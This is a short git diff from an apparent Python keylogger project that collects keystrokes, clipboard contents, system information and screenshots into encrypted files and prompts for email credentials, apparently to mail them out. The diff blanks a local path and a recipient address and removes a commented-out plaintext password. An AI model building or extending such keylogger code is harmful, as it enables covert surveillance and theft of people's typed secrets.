@@ -29,7 +29,7 @@ keys_info="keys.txt"
 sys_info_enc="enc_sys.txt"
 clipb_info_enc="enc_clip.txt"
 keys_info_enc="enc_keys.txt"
-file_path="C:\\Users\\KIIT\\PycharmProjects\\pythonProject1\\keyloggerProj"
+file_path=""
 count=0
 print('''
   _________  ___ ___     _____   ________   ________   __      __
@@ -44,9 +44,8 @@ with open("enc_key.txt","r") as f:
     print(key)
 keys=[]
 email_add=input("Enter email: ")
-#pwd="ryanjames8402"
 pwd=getpass.getpass(prompt='Password: ',stream=None)
-toadd="ryjames4201@gmail.com"
+toadd=""
 #function to get screenshots
 def scrnshot():
     ImageGrab.grab().save(scr_info)
